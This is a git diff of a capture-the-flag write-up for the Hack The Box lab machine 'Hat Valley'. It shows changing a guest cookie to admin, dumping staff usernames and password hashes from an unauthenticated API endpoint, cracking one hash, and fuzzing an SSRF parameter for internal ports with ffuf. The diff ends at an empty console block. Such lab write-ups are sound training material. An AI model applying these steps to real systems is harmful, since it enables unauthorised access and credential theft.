@@ -25,6 +25,8 @@ Nmap done: 1 IP address (1 host up) scanned in 17.84 seconds
 ```
 From looking at the webpage we get a hint about a second domain.
 
+![image](https://user-images.githubusercontent.com/105310322/199103710-c61536bd-ced7-4cdf-b646-5f84ac5013fd.png)
+
 
 Fuzzing for it gave us back a webpage but unfortunately we cannot access it without some credentials. We can try it out later if we find anything.
 
@@ -61,11 +63,19 @@ ________________________________________________
 
 
 
-Upon inspection of Webpack/src files(In the webpage inspector) I found references to api and hr. Trying /hr brought me to a dashboard. It was also required to change the cookie to admin. I am pretty sure you can change it to anything and it will work.
+Upon inspection of Webpack/src files(In the webpage inspector) I found references to api and hr. Trying /hr brought me to a dashboard. However we needed a login.
 
+![image](https://user-images.githubusercontent.com/105310322/199103825-d8ee6ebf-30a5-400a-9a6d-5e7c94de8b57.png)
 
+By checking for cookies we see that we have a cookie as guest and changing it to admin will let us login. I am pretty sure you can change it to anything and it will work.
+
+![image](https://user-images.githubusercontent.com/105310322/199104013-61f71a27-58d9-486c-b028-de85354b6714.png)
+
+Now we are logged in as nobody and cannot do much.
 
 When trying to capture more requests in burp I noticed that there was additional pages being loaded however I was unable to access them due to a jwt token error. This was rectified by removing the cookie and loading the page again revealing usernames and hashes.
+
+The important page was /api/staff-details which upon sending it a request with a missing cookie we get the following output.
 
 ```
 HTTP/1.1 200 OK
@@ -80,9 +90,24 @@ etag: W/"307-yT9RDkJOX+lsRRlC/J2nEu9d6Is"
 
 [{"user_id":1,"username":"christine.wool","password":"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649","fullname":"Christine Wool","role":"Founder, CEO","phone":"0415202922"},{"user_id":2,"username":"christopher.jones","password":"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1","fullname":"Christopher Jones","role":"Salesperson","phone":"0456980001"},{"user_id":3,"username":"jackson.lightheart","password":"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436","fullname":"Jackson Lightheart","role":"Salesperson","phone":"0419444111"},{"user_id":4,"username":"bean.hill","password":"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f","fullname":"Bean Hill","role":"System Administrator","phone":"0432339177"}]
 ```
+Nice we have a bunch of hashes that we can try cracking. Since they looked pretty simple I ran them through crackstations website.
 
+![image](https://user-images.githubusercontent.com/105310322/199104591-01eaaee3-e3a6-431f-9f64-7e77c099a87d.png)
 
-e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1	sha256	chris123
+1 hash cracks (chris123) and it belongs to christopher.jones. Now we can try logging in as him.
+
+Now we have access to more things and can play with the submit leave field. This however turned out to be a rabbit hole and I later learned that it was patched.
+
+![image](https://user-images.githubusercontent.com/105310322/199104899-ad6f8791-fa4c-4041-b802-8689f98f0049.png)
+
+Before I learned that it was patched I spent alot of time here with the leave form, chris' JWT cookie, and the health check in burp.
+
+Take note of chris' JWT cookie for later.
+
+If we capture the dashboard requests as we did earlier we can mess with another interesting one. ```/api/store-status?url=```
+I ran a bunch of different rev shells and attempted other forms of SSRF before realizing I should fuzz it for internal ports.
+
+Upon doing so we get a new port 3002.
 
 ```console
 └─$ ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt  -u http://hat-valley.htb/api/store-status?url=%20http://localhost:FUZZ/%20 -v -fs 0  -c                 
@@ -122,6 +147,9 @@ ________________________________________________
 
 :: Progress: [10000/10000] :: Job [1/1] :: 546 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
 ```
+
+
+
 
 
 ```console
